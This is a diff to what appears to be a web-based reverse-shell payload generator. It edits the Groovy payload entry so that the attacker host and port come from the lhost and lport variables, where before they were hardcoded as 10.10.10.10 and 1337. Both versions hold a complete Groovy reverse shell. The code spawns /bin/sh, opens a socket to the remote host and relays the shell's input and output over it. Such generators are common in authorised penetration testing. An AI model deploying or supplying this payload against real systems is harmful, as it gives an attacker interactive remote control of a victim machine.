@@ -878,7 +878,7 @@ layout: "post"
             res_raw_hljs = "groovy";
             res_oneliner_hljs = "bash";
             res_encoded_hljs = "bash";
-            res_raw = "String host=\"10.10.10.10\";\nint port=1337;\nString cmd=\"/bin/sh\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){\n\twhile(pi.available()>0)so.write(pi.read());\n\twhile(pe.available()>0)so.write(pe.read());\n\twhile(si.available()>0)po.write(si.read());\n\tso.flush();\n\tpo.flush();\n\tThread.sleep(50);\n\ttry {\n\t\tp.exitValue();\n\t\tbreak;\n\t} catch (Exception e){}\n};\np.destroy();\ns.close();";
+            res_raw = "String host=\"" + lhost + "\";\nint port=" + lport + ";\nString cmd=\"/bin/sh\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){\n\twhile(pi.available()>0)so.write(pi.read());\n\twhile(pe.available()>0)so.write(pe.read());\n\twhile(si.available()>0)po.write(si.read());\n\tso.flush();\n\tpo.flush();\n\tThread.sleep(50);\n\ttry {\n\t\tp.exitValue();\n\t\tbreak;\n\t} catch (Exception e){}\n};\np.destroy();\ns.close();";
             res_oneliner = "# No one-liner for this payload";
             res_encoded = "# No encoder for this payload";
         }
